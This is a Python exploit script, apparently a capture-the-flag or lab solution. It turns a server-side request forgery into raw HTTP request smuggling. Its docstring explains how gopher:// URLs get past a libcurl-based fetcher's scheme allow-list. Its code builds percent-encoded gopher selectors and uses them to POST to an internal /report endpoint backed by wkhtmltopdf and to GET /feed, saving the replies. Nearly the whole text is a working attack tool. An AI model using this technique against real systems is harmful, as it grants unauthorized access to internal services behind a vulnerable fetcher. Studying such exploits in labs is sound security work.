#!/usr/bin/env python3
"""Raw HTTP smuggling through the console's SSRF via gopher://.

The console fetches `feed` with a **libcurl**-based client (the fault strings give it
away: "Failed to connect to 127.0.0.1 port 1 after 0 ms", "URL rejected: Malformed
input to a URL function", "Could not resolve host"). It allow-lists only the schemes it
labels "unsupported transport" (file, data, bare words), but gopher survives that check,
and libcurl's gopher handler sends a percent-decoded selector verbatim over the socket.

So one gopher URL = one arbitrary raw HTTP request from inside the container, and the
response comes back byte-for-byte inside <pre class="tape">, headers included. That is
what unlocks the station's POST-only /report (wkhtmltopdf 0.12.5).
"""
import html as H
import re
import sys
import time
import urllib.parse

import ssrf


def gopher_raw(method, path, body="", headers=(), host="127.0.0.1", port=8000):
    req = ["%s %s HTTP/1.1" % (method, path),
           "Host: %s:%d" % (host, port),
           "Accept: */*",
           "Connection: close"]
    req += list(headers)
    if body:
        req.append("Content-Length: %d" % len(body.encode()))
    wire = "\r\n".join(req) + "\r\n\r\n" + body
    sel = urllib.parse.quote(wire, safe="")
    return "gopher://%s:%d/_%s" % (host, port, sel)


def call(label, feed, wait=2.0):
    st, pg = ssrf.get("/", feed=feed, timeout=40)
    code = (re.search(r"bytes=(\S+?)\s*-->", pg) or [None, "?"])[1]
    t = re.search(r'<pre class="tape">(.*?)</pre>', pg, re.S)
    tape = H.unescape(urllib.parse.unquote(t.group(1))) if t else ""
    fault = re.search(r'<p class="fault">(.*?)</p>', pg, re.S)
    out = "%s http=%s bytes=%s fault=%r" % (label, st, code,
                                            H.unescape(fault.group(1))[:60] if fault else None)
    sys.stdout.buffer.write((out + "\n").encode("utf-8", "replace"))
    sys.stdout.buffer.write(("   " + repr(tape[:220]) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()
    time.sleep(wait)
    return tape


if __name__ == "__main__":
    # 1. sanity: a real POST to the station's /report with harmless content
    body = "content=" + "<h1>Feb 2 Summary</h1>"
    tape = call("POST /report (harmless)",
                gopher_raw("POST", "/report", body,
                           [("Content-Type: application/x-www-form-urlencoded")]))
    open("../files/report_probe.txt", "w", encoding="utf-8").write(tape)
    # 2. GET /feed over the same channel, to compare a known-good response
    call("GET /feed over gopher", gopher_raw("GET", "/feed"))
